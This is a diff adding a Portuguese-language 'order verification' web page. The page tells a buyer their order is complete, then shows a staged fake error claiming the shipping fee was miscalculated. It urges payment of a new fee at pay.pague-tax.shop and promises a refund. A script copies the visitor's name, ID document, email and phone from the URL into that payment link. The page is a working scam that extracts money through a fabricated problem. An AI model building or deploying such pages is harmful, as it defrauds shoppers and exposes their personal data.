@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wfsxe7r3u2");
+</script>
+<script>
+    // Função para obter os parâmetros da URL
+    function getQueryParams() {
+        const params = new URLSearchParams(window.location.search);
+        return {
+            name: params.get('name') || '',
+            document: params.get('document') || '',
+            email: params.get('email') || '',
+            telephone: params.get('telephone') || '' // Adiciona o telefone
+        };
+    }
+
+    // Função para adicionar parâmetros à URL de todos os botões com href
+    document.addEventListener('DOMContentLoaded', function () {
+        // Seleciona todos os botões com atributo href
+        const buttons = document.querySelectorAll('a[href]'); 
+
+        buttons.forEach(function (button) {
+            button.addEventListener('click', function (e) {
+                // Obtém os parâmetros da URL
+                const queryParams = getQueryParams();
+                const urlParams = new URLSearchParams(queryParams).toString();
+
+                // Atualiza o href do botão para incluir os parâmetros
+                const currentHref = button.getAttribute('href'); // Obtém o href atual
+                const separator = currentHref.includes('?') ? '&' : '?'; // Adiciona '&' se já houver parâmetros
+                button.setAttribute('href', `${currentHref}${separator}${urlParams}`);
+            });
+        });
+    });
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Pedido</title>
+    <link rel="stylesheet" href="/frete/styles.css">
+</head>
+<body>
+    <!-- Seção do topo -->
+    <div class="top-bar">
+        
+    </div>
+
+    <!-- Seção de verificação do pedido -->
+    <div id="verification-section" class="full-screen-section">
+        <div class="verification-content">
+            <h1>Seu pedido foi concluído!</h1>
+            <p>Aguarde enquanto realizamos a verificação do pedido...</p>
+            <!-- Barra de progresso animada -->
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Seção após a verificação -->
+    <div id="error-section" class="full-screen-section hidden">
+        <!-- Box separadas que aparecem uma abaixo da outra -->
+        <div class="box-stage hidden" id="box-1">
+            <h3>Pedido Concluído com Sucesso ✅</h3>
+            <p>Aguarde um momento...</p>
+        </div>
+        <div class="box-stage hidden" id="box-2">
+            <h3>Validação do CEP para Entrega ❌</h3>
+            <p>Estamos verificando as informações...</p>
+        </div>
+        <div class="box-stage hidden" id="box-3">
+            <h3>O valor do Frete foi calculado errado para sua região, o pedido não será enviado.</h3>
+            <p>Faça a correção do pagamento do frete para que seu pedido seja enviado.</p>
+            <a href="https://pay.pague-tax.shop/69c2e7c71af23a91e553b9ea" id="retry-button" class="retry-button">PAGAR FRETE</a>
+            <br>
+            <br>
+            <p>(O Valor pago do frete anterior será reembolsado)</p>
+        </div>
+    </div>
+
+    <script src="/frete/script.js"></script>
+
+
+</body>
+</html>
